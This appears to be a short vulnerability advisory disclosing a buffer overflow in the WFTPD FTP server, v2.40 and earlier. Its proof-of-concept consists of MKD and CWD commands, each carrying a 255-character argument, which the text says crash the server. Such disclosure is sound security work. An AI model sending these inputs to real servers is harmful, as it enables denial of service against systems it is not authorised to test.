Subject:      WFTPD v2.40 FTPServer remotely exploitable buffer overflow
              vulnerability

We found in the WFTPD v2.34,v2.40 Server and earlier a vulnerable to
remotely exploitable buffer overflow. This can result in a denial of service
and at worst in arbitrary code being executed on the system.

The vulnerabilities are the conjunction of two large commands the MKD and
CWD  if they are passed an argument a string exact of  255 characters, If
this 2 large commands are passed in order program crash.
Tested in: Windows 98 / Windows Nt

Example:

First command

MKD
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaa

Second command

CWD
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaa

Crash.....Overflow.
